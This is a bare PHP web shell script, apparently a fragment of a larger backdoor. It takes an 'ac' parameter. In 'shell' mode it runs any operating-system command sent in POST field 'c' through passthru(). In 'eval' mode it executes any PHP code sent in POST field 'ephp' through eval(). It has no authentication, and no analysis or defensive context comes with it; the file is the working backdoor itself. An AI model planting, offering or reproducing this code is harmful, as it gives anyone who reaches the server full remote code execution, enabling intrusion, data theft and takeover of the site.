<?php


if (!empty($_GET['ac'])) 
	$ac = $_GET['ac'];
elseif (!empty($_POST['ac'])) 
	$ac = $_POST['ac'];
else 
	$ac = "shell";




switch($ac) {

// Shell
case "shell":
	if (!empty($_POST['c'])){
		passthru($_POST['c']);
	}
	echo "</textarea></td>$tend";
	break;


//PHP Eval Code execution
case "eval":
    if (isset($_POST['ephp'])){
        eval($_POST['ephp']);
    }
    break;

}
?>
